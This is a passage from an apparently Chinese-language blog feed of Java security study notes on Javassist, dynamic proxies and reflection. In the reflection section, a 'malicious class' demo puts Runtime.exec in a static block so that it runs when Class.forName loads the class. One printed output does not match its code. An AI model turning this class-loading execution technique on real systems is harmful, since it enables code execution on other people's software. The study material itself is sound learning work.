<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用ClassPool创建一个新的类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;org.example.haha&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建类成员变量content</span></span><br><span class="line">            <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;private static String content = \&quot;Hello world~\&quot;;&quot;</span>, ctClass);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将成员变量添加到ctClass对象中</span></span><br><span class="line">            ctClass.addField(ctField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建一个主方法并输出content对象值</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtMethod.make(</span><br><span class="line">                    <span class="string">&quot;public static void main(String[] args) &#123; System.out.println(content); &#125;&quot;</span>, ctClass</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将成员方法添加到ctClass对象中</span></span><br><span class="line">            ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用类CtClass，生成类二进制</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出二进制数据到控制台</span></span><br><span class="line">            System.out.println(Arrays.toString(bytes));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将class二进制内容写入到类文件</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">classFilePath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.dir&quot;</span>), <span class="string">&quot;maven_text/output/org/example&quot;</span>), <span class="string">&quot;haha.class&quot;</span>);</span><br><span class="line">            FileUtils.writeByteArrayToFile(classFilePath, bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将生成的类写入文件系统</span></span><br><span class="line">            ctClass.writeFile(<span class="string">&quot;output&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看一看代码理解一下。</p>
<p>然后生成如下目录结构：</p>
<p><img src="/2024/06/23/Java%20Javassist/image-20240622211651698.png" alt="image-20240622211651698"></p>
<p>haha.class的内容同上。</p>
<p>有个点稍微说明一下，使用如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;org.example.erqi&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;public String name = \&quot;ahhaha\&quot;; &quot;</span>,ctClass);</span><br><span class="line">        ctClass.addField(ctField);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public void setName(String name)&#123; this.name = name ;&#125;&quot;</span>,ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        System.out.println(ctClass);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javassist.CtNewClass@67f89fa3[hasConstructor changed frozen public class org.example.erqi fields=org.example.erqi.name:Ljava/lang/String;,  constructors=javassist.CtConstructor@4ac68d3e[public erqi ()V],  methods=javassist.CtMethod@ab2416c4[public setName (Ljava/lang/String;)V], ]</span><br><span class="line"></span><br><span class="line">class org.example.erqi</span><br></pre></td></tr></table></figure>

<p>细心的师傅可能都已经发现了，对于前面所有的用过的代码，我们的操作层面都是字节码，所以生成的文件都是class文件，可以理解一下这个输出结果。</p>
<p>最后，既然我们都已经生成了<code>.class</code>文件，那么我们现在就可以利用很多方法了，比如动态加载字节码。注意思考。</p>
<p>参考文章：</p>
<p><code>https://cloud.tencent.com/developer/article/1815164</code></p>
<p><code>https://nivi4.notion.site/Java-Javassist-621beee2064a4494abe794843028449d</code></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java基础</category>
        <category>Javassist</category>
      </categories>
  </entry>
  <entry>
    <title>Java动态代理</title>
    <url>/2024/06/19/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>利用了代理模式，一个通俗易懂的说法：给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。</p>
<span id="more"></span>

<h2 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h2><p>代理模式是Java中常见的设计模式。</p>
<p>其特征是代理类和委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把信息转发给委托类，以及事后处理消息等。</p>
<p>代理类与委托类之间通常会存在关联关系，一个代理类对象与一个委托类对象关联，代理类对象本身并不真正实现服务，而是通过委托类对象的相关方法来提供特定服务。</p>
<p><img src="/2024/06/19/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20240616202423103.png" alt="image-20240616202423103"></p>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>需要代理对象和目标对象实现同样的接口。</p>
<p><strong>缺点：</strong>当需要的代理的对象过多就需要实现大量的代理类，并且当接口增加方法，目标对象与代理对象都要进行修改</p>
<p>直接用参考文章的一个demo来演示一下什么是静态代理，理解一下</p>
<p>Event.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//委托类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;出租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代理类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Event target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">(Event target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房子出租为1k-3k&quot;</span>);</span><br><span class="line">        target.sale();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终的测试类：Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">consumer</span><span class="params">(Event subject)</span>&#123;</span><br><span class="line">        subject.sale();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Event</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();<span class="comment">//创建一个Text类的实例，并将其赋值给一个Event类型的变量test。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;---使用代理之前---&quot;</span>);</span><br><span class="line">        consumer(test);</span><br><span class="line">        System.out.println(<span class="string">&quot;---使用代理之后---&quot;</span>);</span><br><span class="line">        consumer(<span class="keyword">new</span> <span class="title class_">Main</span>(test));<span class="comment">//这里的new Main()会先调用Main的构造函数，使得subject为Main()实例，并且Main中的target为Text()实例，所以会先调用Main()中的sale()，然后再调用Text()中的sale()，最后会生成如下结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---使用代理之前---</span><br><span class="line">出租房子</span><br><span class="line">---使用代理之后---</span><br><span class="line">房子出租为1k-3k</span><br><span class="line">出租房子</span><br></pre></td></tr></table></figure>

<p>现在来想想为什么要这么用，</p>
<p>我们这里都是用的接口类作为类型，并且构造函数的接收的参数类型也都是接口类型。</p>
<p>然后再调用函数，先主要看看测试类的<code>consumer()</code>方法的参数以及内容，参数同样接受一个接口类型的参数，重点就在于方法内部的这个<code>subject.sale()</code>，这里决定了调用哪个对象的sale()方法。</p>
<p>现在再看看代理类java文件的构造函数，也是用的接口类型作为参数的。</p>
<p>大概想清楚了，对于代理在这个示例代码中就是注意是如何调用的<code>sale()</code>方法，只要我们可以更改前面的对象，就可以实现使用不同方法体的<code>sale()</code>函数。而这中间的媒介就是接口类型，只要使得最开始定义的对象的类型可以与后面逻辑相对应即可。</p>
<p>那么为什么这里要使用Event接口类型作为媒介呢，应该是因为委托类接口了Event接口，这样就可以使得相应的Text()对象可以成为这个类型，同时代理类Main也接口了Event接口，所以Main类也可以接受Event类型的数据。</p>
<p>还有一个重要的点就是代理类的一串代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房子出租为1k-3k&quot;</span>);</span><br><span class="line">        target.sale();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>就是因为这串代码导致的最终输出为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">房子出租为1k-3k</span><br><span class="line">出租房子</span><br></pre></td></tr></table></figure>

<p>因为我们new后将target对应到了委托类的对象，此时就会调用Text.java中的sale()方法，所以其实一般代理类的重要代码都会调用两次。简单流程图如下</p>
<p><img src="/2024/06/19/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20240616154738359.png" alt="image-20240616154738359"></p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>与静态代理相同，需要公共接口，委托类，代理类。<strong>区别就是动态代理是利用反射机制在运行时创建代理类</strong>。这里需要用到位于<code>Java.lang.reflect</code>下的<code>Proxy类</code>与<code>InvocationHandler接口</code>。</p>
<ul>
<li><strong><code>InvocationHandler接口</code>：负责提供调用代理的操作</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>proxy</code>为代理类的实例对象，<code>method</code>表示调用的方法名，<code>args[]</code>为调用方法的参数数组</p>
<p>这个接口定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到<code>InvocationHandler.invoke()</code>方法进行调用</p>
<ul>
<li><strong><code>Proxy类</code>：负责动态构建代理类</strong></li>
</ul>
<p>提供了静态方法用于得到代理对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span><span class="keyword">throws</span> IllegalArgumentException&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>继续使用前面的那个例子，结合代码，我们这里需要获得类加载器，相对应的方法，直接给代码：</p>
<p>委托类和接口不变，看其他的代码：</p>
<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态获取代理的代理类</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">(Object target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重写invoke()方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房租2k-3k&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target,args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取委托类的实例对象</span></span><br><span class="line">        <span class="type">Text</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">        <span class="comment">// 获取CLassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> test.getClass().getClassLoader();</span><br><span class="line">        <span class="comment">// 获取所有接口</span></span><br><span class="line">        Class[] interfaces = test.getClass().getInterfaces();</span><br><span class="line">        <span class="comment">// 获取一个调用处理器</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>(test);</span><br><span class="line">        <span class="comment">// 创建代理对象</span></span><br><span class="line">        <span class="type">Event</span> <span class="variable">proxy</span> <span class="operator">=</span> (Event) Proxy.newProxyInstance(classLoader,interfaces,invocationHandler);</span><br><span class="line">        <span class="comment">// 调用代理对象的sale()方法</span></span><br><span class="line">        proxy.sale();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">房租2k-3k</span><br><span class="line">出租房子</span><br></pre></td></tr></table></figure>

<p>可以自己调试一下跟一下过程，注意和静态代理那里对比一下，其实本质是差不多的。</p>
<p>参考文章：</p>
<p><code>https://xz.aliyun.com/t/9197?time__1311=n4%2BxuDgD9DyDnB7QGQD%2FD0WoQ4D55i%3D31YNGt4D</code></p>
<p><code>https://www.cnblogs.com/whirly/p/10154887.html</code></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java基础</category>
        <category>Java动态代理</category>
      </categories>
  </entry>
  <entry>
    <title>Java反射机制</title>
    <url>/2024/06/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><p>Java反射（<code>Reflection</code>）是Java非常重要的动态特性<strong>，通过使用反射我们可以获取到任何类的成员方法（<code>Methods</code>）、成员变量（<code>Fields</code>）、构造方法（<code>Constructors</code>）等信息，还可以动态创建Java实例、调用任意的类方法、修改任意的类成员变量值等</strong>。</p>
<p>这是一个重要的机制，可以绕过java私有访问权限检查，反射获取并调用私有的类从而可以进行命令执行</p>
<p>本文JDK测试版本为11,也有的文章说的是非public修饰符，而我测试出来只针对private修饰符，注意版本，其他java文章都是JDK8</p>
<span id="more"></span>

<h2 id="反射机制流程"><a href="#反射机制流程" class="headerlink" title="反射机制流程"></a>反射机制流程</h2><p><img src="/2024/06/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20240612223818680.png" alt="image-20240612223818680"></p>
<p>当我们创建了一个类文件，经过javac编译之后，就会形成.class文件，同时JVM内存会查找生成的.class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取的成员变量，成员方法，和构造方法等。</p>
<p>JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息。获取了某个Class实例，就可以通过这个Class实例获取到该实例对应的class的所有信息</p>
<h2 id="反射常用的包和类"><a href="#反射常用的包和类" class="headerlink" title="反射常用的包和类"></a>反射常用的包和类</h2><p>反射机制相关操作一般位于 <code>java.lang.reflect</code> 包中</p>
<p>需要注意的类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Class：类对象</span><br><span class="line">java.lang.reflect.Constructor：类的构造器对象</span><br><span class="line">java.lang.reflect.Field：类的属性对象</span><br><span class="line">java.lang.reflect.Method：类的方法对象</span><br></pre></td></tr></table></figure>

<h2 id="反射常见使用的方法"><a href="#反射常见使用的方法" class="headerlink" title="反射常见使用的方法"></a>反射常见使用的方法</h2><ul>
<li><p>获取类的方法：<code>forName</code></p>
</li>
<li><p>实例化类对象的方法：<code>newInstance</code></p>
</li>
<li><p>获取函数的方法：<code>getMethod</code></p>
</li>
<li><p>执行函数的方法：<code>invoke</code></p>
</li>
</ul>
<p>我们可以使用这些方法来获得其他类的各种属性和方法</p>
<h3 id="获取class对象"><a href="#获取class对象" class="headerlink" title="获取class对象"></a>获取class对象</h3><p><code>forName</code>不是获取“类”的唯一途径，通常来说还有下面三种<strong>利用<code>java.lang.Class</code>对象</strong>的方式来获取一个“类”</p>
<p><strong>获取Class对象的三种方式：</strong></p>
<ul>
<li>Class.forName(“全类名”)  ：将字节码文件加载进内存，返回Class对象</li>
</ul>
<p>多用于配置文件，将类名定义在配置文件中。读取文件，加载类。</p>
<ul>
<li>类名.class ：通过类名的属性class获取</li>
</ul>
<p>多用于参数的传递</p>
<ul>
<li><strong>对象</strong>.getClass() ：getClass()方法定义于Object类中,并且需要先实例化一个对象。</li>
</ul>
<p>多用于对象的获取字节码的方式</p>
<p>—-————</p>
<p>给一个代码来演示一下获取Class对象的三种方式：</p>
<p><strong>demo</strong>：Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> anay;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;haha,你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;haha,you are right&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取代码：Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ctf</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Text&quot;</span>);</span><br><span class="line">        System.out.println(ctf);</span><br><span class="line">        <span class="type">Main</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ctf2</span> <span class="operator">=</span> t.getClass();</span><br><span class="line">        System.out.println(ctf2);</span><br><span class="line">        Class&lt;?&gt; ctf3 = Text.class;</span><br><span class="line">        System.out.println(ctf3);</span><br><span class="line">        <span class="comment">//获取类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mainName</span> <span class="operator">=</span> ctf.getName();</span><br><span class="line">        System.out.println(mainName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里的&lt;?&gt;代表泛型，表示该`Class`对象可以持有任何类型，在这里有无这个均可</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Main</span><br><span class="line">class Main</span><br><span class="line">class Main</span><br><span class="line">Main</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在获取class对象中，一般使用Class.forName方法去获取，其他两个都有一定的限制。</p>
<p><strong>另外的一个点需要说明</strong></p>
<p>forName有两个函数重载：</p>
<ul>
<li><p><code>Class&lt;?&gt; forName(String name)</code></p>
</li>
<li><p><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code></p>
</li>
</ul>
<p>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader)</span><br></pre></td></tr></table></figure>

<p>默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就是 ClassLoader 。</p>
<p><strong>对于第二个参数，可以将其理解为<u>对一个类的初始化</u>，构造函数并不会执行</strong>，看如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">haha</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, haha.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">haha</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ctf</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Static initial class haha</span><br></pre></td></tr></table></figure>

<p>**这样就可以很容易地看出“类的初始化”调用的是<code>static &#123;&#125;</code>**，然后当我尝试<code>haha x =new haha()</code>这样显式地初始化时，可以发现调用顺序是，先是<code>static&#123;&#125;</code>，其次是<code>&#123;&#125;</code>，最后是构造函数。</p>
<p>可以延伸一下，假设我们有如下函数，其中函数的参数name可控：</p>
<p>我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"> String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line"> <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line"> pc.waitFor();</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> <span class="comment">// do nothing</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h3><p>获取成员变量Field，位于java.lang.reflect.Field中，常使用的方法有如下几种</p>
<ul>
<li>Field[] getFields()：获取所有public修饰的成员变量（包括父类）</li>
<li>Field[] getDeclaredFields()：获取所有的成员变量，不考虑修饰符（不包括父类）</li>
<li>Field getField(String name)：获取指定名称的public修饰的成员变量（包括父类）</li>
<li>Field getDeclaredField(String name)：获取指定的成员变量（不包括父类）</li>
</ul>
<h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><p>还是利用之前那个demo来演示一下</p>
<p>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1:&quot;</span>);</span><br><span class="line">        Field[] field1 = ctf.getFields();<span class="comment">//创建Field需要导包</span></span><br><span class="line">        <span class="keyword">for</span> (Field field : field1)&#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        